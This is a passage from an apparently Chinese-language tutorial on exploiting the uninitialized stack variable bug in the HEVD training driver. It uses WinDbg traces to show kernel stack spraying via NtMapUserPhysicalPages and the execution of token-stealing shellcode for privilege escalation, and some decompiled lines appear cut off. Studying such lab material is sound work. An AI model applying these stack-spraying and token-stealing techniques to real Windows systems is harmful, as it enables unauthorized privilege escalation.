    kd> r
    eax=00000000 ebx=00000000 ecx=01342800 edx=00000065 esi=85844980 edi=85bd88b0
    eip=95327d10 esp=8c1f197c ebp=8c1f1aa8 iopl=0         nv up ei ng nz ac po nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000292
在此之前，内核栈的情况如下图：
注意esp和ebp，现在处于内核栈中，这时候，我们可以通过对内核栈下写入断点，这样在向栈写入数据，也就是栈喷射时会中断。
    kd> g
    nt!memcpy+0x33:
    82882393 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
可以看到，在nt!memcpy中断，这时候执行的是一处拷贝操作，这时候通过kb查看一下堆栈回溯。
    kd> kb
    ChildEBP RetAddr  Args to Child              
    94d12af4 82b2131b 94d12c20 003b09f8 00001000 nt!memcpy+0x33
    94d12b34 82b1f58d 94d12c20 00000000 00b1fcb8 nt!MiCaptureUlongPtrArray+0x3f
    94d13c20 82886db6 00000000 00000400 003b09f8 nt!NtMapUserPhysicalPages+0x9e
    94d13c20 77ca6c74 00000000 00000400 003b09f8 nt!KiSystemServicePostCall
可以看到，函数的调用是NtMapUserPhysicalPages -> MiCaptureUlongPtrArray ->
memcpy，来看一下这个过程的函数实现，首先是nt!NtMapUserPhysicalPages
    NTSTATUS __stdcall NtMapUserPhysicalPages(PVOID BaseAddress, PULONG NumberOfPages, PULONG PageFrameNumbers)
      if ( (unsigned int)NumberOfPages > 0xFFFFF )
        return -1073741584;
      BaseAddressa = (unsigned int)BaseAddress & 0xFFFFF000;
      v33 = ((_DWORD)NumberOfPages  0x400 )//如果要超过1024，就要扩展池，不过这里不用
        {
          v4 = (char *)ExAllocatePoolWithTag(0, 4 * (_DWORD)NumberOfPages, 0x77526D4Du);
          v37 = v4;
          if ( !v4 )
            return -1073741670;
        }
v5 = MiCaptureUlongPtrArray((int)NumberOfPages, (unsigned
int)PageFrameNumbers, v4);//v4 要拷贝的目标 内核栈 a2，要覆盖的EoPBuffer 长度是4*NumberOfPages
对应的注释已经标记，在函数中调用了MiCaptureUlongPtrArray，会将传入NtMapUserPhysicalPages的参数，长度也就是NumberOfPages，内容也就是PageFrameNumbers(详情请参考Exploit中的UninitializedStackVariable.c)，然后进入MiCaptureUlongPtrArray。
    int __fastcall MiCaptureUlongPtrArray(int a1, unsigned int a2, void *a3)
    {
      size_t v3; // ecx@1
      v3 = 4 * a1;
      if ( v3 )
      {
        if ( a2 & 3 )
          ExRaiseDatatypeMisalignment();
        if ( v3 + a2 > (unsigned int)MmUserProbeAddress || v3 + a2  p
    nt!memcpy+0x35:
    82882395 ff2495ac248882  jmp     dword ptr nt!memcpy+0x14c (828824ac)[edx*4]
    kd> dd 94d139e4
    94d139e4  00c62800 00c62800 00c62800 00c62800
    94d139f4  00c62800 00c62800 00c62800 00c62800
    94d13a04  00c62800 00c62800 00c62800 00c62800
    94d13a14  00c62800 00c62800 00c62800 00c62800
    94d13a24  00c62800 00c62800 00c62800 00c62800
memcpy之后，可以看到栈地址空间被喷射上了shellcode的指针，接下来触发漏洞，关于触发的原理阅读HEVD.sys源码很清晰，这里不详细介绍，大致就是当传入的UserValue，和漏洞的MagicValue不一样的情况下，就可以引发未初始化变量。
    kd> p
    HEVD+0x2cac:
    95327cac 8b95ecfeffff    mov     edx,dword ptr [ebp-114h]
    kd> dd ebp-114
    8c1f1994  baadf00d 01342800 01342800 01342800
    8c1f19a4  01342800 01342800 01342800 01342800
    8c1f19b4  01342800 01342800 01342800 01342800
    8c1f19c4  01342800 01342800 01342800 01342800
    8c1f19d4  01342800 01342800 01342800 01342800
    8c1f19e4  01342800 01342800 01342800 01342800
    8c1f19f4  01342800 01342800 01342800 01342800
在进入HEVD的Trigger函数之后，可以看到此时内核栈已经被覆盖，这时候UserValue的值，也就是我们可控的值是baadf00d，随后看一下StackVariable结构体的内容。
    kd> p
    HEVD+0x2ccc:
    95327ccc e853d8ffff      call    HEVD+0x524 (95325524)
    kd> r eax
    eax=8c1f1998
    kd> dd 8c1f1998
    8c1f1998  01342800 01342800 01342800 01342800
    8c1f19a8  01342800 01342800 01342800 01342800
    8c1f19b8  01342800 01342800 01342800 01342800
    8c1f19c8  01342800 01342800 01342800 01342800
随后会对UserValue和MagicValue进行比较。
    kd> p
    HEVD+0x2cda:
    95327cda 3b4de0          cmp     ecx,dword ptr [ebp-20h]
    kd> p
    HEVD+0x2cdd:
    95327cdd 7516            jne     HEVD+0x2cf5 (95327cf5)
    kd> r ecx
    ecx=baadf00d
    kd> dd ebp-20
    8c1f1a88  bad0b0b0
UserValue是baadf00d，而HEVD.sys的MagicValue的值是bad0b0b0，不相等的情况下，不会对之前的StackVariable结构体中的成员变量初始化，而此时成员变量的值都被shellcode覆盖，最后引用，导致在内核态进入shellcode。
    kd> p
    HEVD+0x2d33:
    95327d33 ff95f4feffff    call    dword ptr [ebp-10Ch]
    kd> dd ebp-10c
    8c1f199c  01342800
    01342800 55              push    ebp
    01342801 8bec            mov     ebp,esp
    01342803 83e4f8          and     esp,0FFFFFFF8h
    01342806 83ec34          sub     esp,34h
    01342809 33c0            xor     eax,eax
    0134280b 56              push    esi
    0134280c 33f6            xor     esi,esi
最后在内核态执行shellcode，替换当前进程token为System token，完成提权。
**0x03 Uninitialized Stack & Heap**